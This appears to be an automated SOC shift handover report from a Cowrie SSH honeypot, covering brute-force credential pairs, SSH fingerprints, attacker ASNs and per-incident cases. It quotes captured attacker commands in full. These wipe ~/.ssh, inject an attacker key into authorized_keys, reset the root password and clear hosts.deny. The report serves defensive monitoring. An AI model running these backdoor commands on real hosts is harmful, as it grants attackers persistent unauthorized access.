# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-20 |
| **Generated At** | 2026-05-20T15:30:32Z |
| **Shift Time** | 15:30 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **1332** |
| Confirmed Threats | **1279** |
| False Positives Filtered | **53** (4.0%) |
| Unique Attacker IPs | **43** |
| Countries of Origin | **19** |
| High Severity Cases | **23** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **1309** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **39** |
| Unique Credential Pairs | **20** |
| Unique Usernames | **7** |
| Unique Passwords | **20** |
| Successful Auth Pairs | **18** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 23 |
| `345gs5662d34` | 11 |
| `claude` | 1 |
| `mrodelo` | 1 |
| `dbadmin` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 11 |
| `3245gs5662d34` | 10 |
| `Huawei_123` | 1 |
| `fulgercsmode123` | 1 |
| `konstantin` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 11 |
| `root` | `3245gs5662d34` | 10 |
| `root` | `Huawei_123` | 1 |
| `root` | `fulgercsmode123` | 1 |
| `root` | `konstantin` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Huawei_123` | `70.120.203.193` | 2026-05-20T11:39:32 |
| `root` | `3245gs5662d34` | `70.120.203.193` | 2026-05-20T11:39:38 |
| `root` | `fulgercsmode123` | `118.186.7.9` | 2026-05-20T13:19:51 |
| `root` | `3245gs5662d34` | `118.186.7.9` | 2026-05-20T13:19:55 |
| `root` | `konstantin` | `14.103.90.30` | 2026-05-20T13:20:27 |
| `root` | `password1234` | `193.24.211.100` | 2026-05-20T13:20:30 |
| `root` | `3245gs5662d34` | `14.103.90.30` | 2026-05-20T13:20:31 |
| `root` | `zaq123` | `20.116.34.103` | 2026-05-20T13:26:47 |
| `root` | `3245gs5662d34` | `20.116.34.103` | 2026-05-20T13:26:52 |
| `root` | `qazxsw123` | `20.116.34.103` | 2026-05-20T13:28:06 |
| `root` | `Ab-1234567890` | `14.103.115.213` | 2026-05-20T13:28:40 |
| `root` | `Manager1` | `101.126.89.164` | 2026-05-20T13:29:05 |
| `root` | `xbm` | `20.116.34.103` | 2026-05-20T13:29:24 |
| `root` | `bbs123` | `20.116.34.103` | 2026-05-20T13:30:51 |
| `root` | `FZAc8jnw.XdKgFZAc8jnw.XdKg` | `20.116.34.103` | 2026-05-20T13:32:16 |
| `root` | `adm1n` | `20.116.34.103` | 2026-05-20T13:33:48 |
| `root` | `qwe` | `165.154.245.169` | 2026-05-20T15:23:24 |
| `root` | `3245gs5662d34` | `165.154.245.169` | 2026-05-20T15:23:27 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **1332** |
| Sessions with Fingerprint | **7** |
| Unique HASSH Fingerprints | **7** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 44 |
| Unknown | 4 |
| Go SSH scanner | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 35 | 5 |
| `03a80b21afa8...` | Modern SSH client | 6 | 2 |
| `e37f354a101a...` | Mirai/variant | 2 | 1 |
| `9052c4ab4164...` | Mirai/variant | 1 | 1 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 35 | 5 | Mirai/variant |
| `03a80b21afa8...` | libssh | 6 | 2 | Modern SSH client |
| `95420f9d932d...` | Unknown | 4 | 3 | — |
| `e37f354a101a...` | libssh | 2 | 1 | Mirai/variant |
| `9052c4ab4164...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `14b2ddda386a...` | libssh | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1082, T1592` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 10 | 5 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:dD80wwks7b69"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `14.103.115.213`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:36LVSzKAZQq3"|chpasswd|bash
```
Source IPs: `101.126.89.164`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `118.186.7.9`, `20.116.34.103`, `70.120.203.193`, `14.103.90.30`, `165.154.245.169`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **43** |
| Unique ASNs | **30** |
| High-Risk ASNs | **19** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 8 | HIGH |
| `AS213412` | ONYPHE SAS | 4 | HIGH |
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS14618` | Amazon.com, Inc. | 1 | HIGH |
| `AS140308` | CHINATELECOM Guangdong province Zhuhai 5G network | 1 | LOW |
| `AS215929` | Data Campus Limited | 1 | HIGH |
| `AS3215` | Orange S.A. | 1 | MEDIUM |

---

---

## 🚨 Priority Cases — Immediate Attention (23)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-035f3561a58f

| Field | Detail |
|---|---|
| **Source IP** | `70.120.203[.]193` |
| **First Seen** | 2026-05-20 11:39 |
| **Last Seen** | 2026-05-20 11:39 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 11:39:31` | `cowrie.session.connect` |
| `2026-05-20 11:39:31` | `cowrie.client.version` |
| `2026-05-20 11:39:31` | `cowrie.client.kex` |
| `2026-05-20 11:39:32` | `cowrie.login.success` |
| `2026-05-20 11:39:33` | `cowrie.session.params` |
| `2026-05-20 11:39:33` | `cowrie.command.input` |
| `2026-05-20 11:39:33` | `cowrie.command.failed` |
| `2026-05-20 11:39:33` | `cowrie.log.closed` |
| `2026-05-20 11:39:34` | `cowrie.session.params` |
| `2026-05-20 11:39:34` | `cowrie.command.input` |
| `2026-05-20 11:39:34` | `cowrie.session.file_download` |
| `2026-05-20 11:39:34` | `cowrie.log.closed` |
| `2026-05-20 11:39:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `70.120.203[.]193` to AbuseIPDB if not already reported
- [ ] Block `70.120.203[.]193` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-294436652b9e

| Field | Detail |
|---|---|
| **Source IP** | `70.120.203[.]193` |
| **First Seen** | 2026-05-20 11:39 |
| **Last Seen** | 2026-05-20 11:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 11:39:37` | `cowrie.session.connect` |
| `2026-05-20 11:39:37` | `cowrie.client.version` |
| `2026-05-20 11:39:37` | `cowrie.client.kex` |
| `2026-05-20 11:39:38` | `cowrie.login.success` |
| `2026-05-20 11:39:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `70.120.203[.]193` to AbuseIPDB if not already reported
- [ ] Block `70.120.203[.]193` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7152227bcdef

| Field | Detail |
|---|---|
| **Source IP** | `118.186.7[.]9` |
| **First Seen** | 2026-05-20 13:19 |
| **Last Seen** | 2026-05-20 13:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 13:19:50` | `cowrie.session.connect` |
| `2026-05-20 13:19:50` | `cowrie.client.version` |
| `2026-05-20 13:19:50` | `cowrie.client.kex` |
| `2026-05-20 13:19:51` | `cowrie.login.success` |
| `2026-05-20 13:19:51` | `cowrie.session.params` |
| `2026-05-20 13:19:51` | `cowrie.command.input` |
| `2026-05-20 13:19:51` | `cowrie.command.failed` |
| `2026-05-20 13:19:51` | `cowrie.log.closed` |
| `2026-05-20 13:19:52` | `cowrie.session.params` |
| `2026-05-20 13:19:52` | `cowrie.command.input` |
| `2026-05-20 13:19:52` | `cowrie.session.file_download` |
| `2026-05-20 13:19:52` | `cowrie.log.closed` |
| `2026-05-20 13:19:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.186.7[.]9` to AbuseIPDB if not already reported
- [ ] Block `118.186.7[.]9` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89b3f52f529d

| Field | Detail |
|---|---|
| **Source IP** | `118.186.7[.]9` |
| **First Seen** | 2026-05-20 13:19 |
| **Last Seen** | 2026-05-20 13:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 13:19:54` | `cowrie.session.connect` |
| `2026-05-20 13:19:54` | `cowrie.client.version` |
| `2026-05-20 13:19:54` | `cowrie.client.kex` |
| `2026-05-20 13:19:55` | `cowrie.login.success` |
| `2026-05-20 13:19:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.186.7[.]9` to AbuseIPDB if not already reported
- [ ] Block `118.186.7[.]9` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-351a4b743472

| Field | Detail |
|---|---|
| **Source IP** | `14.103.90[.]30` |
| **First Seen** | 2026-05-20 13:20 |
| **Last Seen** | 2026-05-20 13:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 13:20:26` | `cowrie.session.connect` |
| `2026-05-20 13:20:26` | `cowrie.client.version` |
| `2026-05-20 13:20:27` | `cowrie.client.kex` |
| `2026-05-20 13:20:27` | `cowrie.login.success` |
| `2026-05-20 13:20:27` | `cowrie.session.params` |
| `2026-05-20 13:20:27` | `cowrie.command.input` |
| `2026-05-20 13:20:27` | `cowrie.command.failed` |
| `2026-05-20 13:20:27` | `cowrie.log.closed` |
| `2026-05-20 13:20:28` | `cowrie.session.params` |
| `2026-05-20 13:20:28` | `cowrie.command.input` |
| `2026-05-20 13:20:28` | `cowrie.session.file_download` |
| `2026-05-20 13:20:28` | `cowrie.log.closed` |
| `2026-05-20 13:20:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.90[.]30` to AbuseIPDB if not already reported
- [ ] Block `14.103.90[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2793f01e4ce

| Field | Detail |
|---|---|
| **Source IP** | `193.24.211[.]100` |
| **First Seen** | 2026-05-20 13:20 |
| **Last Seen** | 2026-05-20 13:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 13:20:29` | `cowrie.session.connect` |
| `2026-05-20 13:20:29` | `cowrie.client.version` |
| `2026-05-20 13:20:29` | `cowrie.client.kex` |
| `2026-05-20 13:20:30` | `cowrie.login.success` |
| `2026-05-20 13:20:30` | `cowrie.direct-tcpip.request` |
| `2026-05-20 13:20:30` | `cowrie.direct-tcpip.ja4h` |
| `2026-05-20 13:20:30` | `cowrie.direct-tcpip.data` |
| `2026-05-20 13:20:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.24.211[.]100` to AbuseIPDB if not already reported
- [ ] Block `193.24.211[.]100` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4655d7eb6ef4

| Field | Detail |
|---|---|
| **Source IP** | `14.103.90[.]30` |
| **First Seen** | 2026-05-20 13:20 |
| **Last Seen** | 2026-05-20 13:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 13:20:30` | `cowrie.session.connect` |
| `2026-05-20 13:20:30` | `cowrie.client.version` |
| `2026-05-20 13:20:30` | `cowrie.client.kex` |
| `2026-05-20 13:20:31` | `cowrie.login.success` |
| `2026-05-20 13:20:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.90[.]30` to AbuseIPDB if not already reported
- [ ] Block `14.103.90[.]30` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d2836cd7c1a

| Field | Detail |
|---|---|
| **Source IP** | `20.116.34[.]103` |
| **First Seen** | 2026-05-20 13:26 |
| **Last Seen** | 2026-05-20 13:26 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 13:26:46` | `cowrie.session.connect` |
| `2026-05-20 13:26:46` | `cowrie.client.version` |
| `2026-05-20 13:26:46` | `cowrie.client.kex` |
| `2026-05-20 13:26:47` | `cowrie.login.success` |
| `2026-05-20 13:26:48` | `cowrie.session.params` |
| `2026-05-20 13:26:48` | `cowrie.command.input` |
| `2026-05-20 13:26:48` | `cowrie.command.failed` |
| `2026-05-20 13:26:48` | `cowrie.log.closed` |
| `2026-05-20 13:26:48` | `cowrie.session.params` |
| `2026-05-20 13:26:48` | `cowrie.command.input` |
| `2026-05-20 13:26:48` | `cowrie.session.file_download` |
| `2026-05-20 13:26:48` | `cowrie.log.closed` |
| `2026-05-20 13:26:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.116.34[.]103` to AbuseIPDB if not already reported
- [ ] Block `20.116.34[.]103` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee7af3933cb7

| Field | Detail |
|---|---|
| **Source IP** | `20.116.34[.]103` |
| **First Seen** | 2026-05-20 13:26 |
| **Last Seen** | 2026-05-20 13:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 13:26:51` | `cowrie.session.connect` |
| `2026-05-20 13:26:51` | `cowrie.client.version` |
| `2026-05-20 13:26:51` | `cowrie.client.kex` |
| `2026-05-20 13:26:52` | `cowrie.login.success` |
| `2026-05-20 13:26:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.116.34[.]103` to AbuseIPDB if not already reported
- [ ] Block `20.116.34[.]103` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6963743b2820

| Field | Detail |
|---|---|
| **Source IP** | `20.116.34[.]103` |
| **First Seen** | 2026-05-20 13:28 |
| **Last Seen** | 2026-05-20 13:28 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 13:28:05` | `cowrie.session.connect` |
| `2026-05-20 13:28:05` | `cowrie.client.version` |
| `2026-05-20 13:28:05` | `cowrie.client.kex` |
| `2026-05-20 13:28:06` | `cowrie.login.success` |
| `2026-05-20 13:28:06` | `cowrie.session.params` |
| `2026-05-20 13:28:06` | `cowrie.command.input` |
| `2026-05-20 13:28:06` | `cowrie.command.failed` |
| `2026-05-20 13:28:07` | `cowrie.log.closed` |
| `2026-05-20 13:28:07` | `cowrie.session.params` |
| `2026-05-20 13:28:07` | `cowrie.command.input` |
| `2026-05-20 13:28:07` | `cowrie.session.file_download` |
| `2026-05-20 13:28:07` | `cowrie.log.closed` |
| `2026-05-20 13:28:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.116.34[.]103` to AbuseIPDB if not already reported
- [ ] Block `20.116.34[.]103` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fabc090bf93

| Field | Detail |
|---|---|
| **Source IP** | `20.116.34[.]103` |
| **First Seen** | 2026-05-20 13:28 |
| **Last Seen** | 2026-05-20 13:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 13:28:10` | `cowrie.session.connect` |
| `2026-05-20 13:28:10` | `cowrie.client.version` |
| `2026-05-20 13:28:10` | `cowrie.client.kex` |
| `2026-05-20 13:28:11` | `cowrie.login.success` |
| `2026-05-20 13:28:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.116.34[.]103` to AbuseIPDB if not already reported
- [ ] Block `20.116.34[.]103` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7f0172a96ca

| Field | Detail |
|---|---|
| **Source IP** | `14.103.115[.]213` |
| **First Seen** | 2026-05-20 13:28 |
| **Last Seen** | 2026-05-20 13:29 |
| **Session Duration** | 38s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
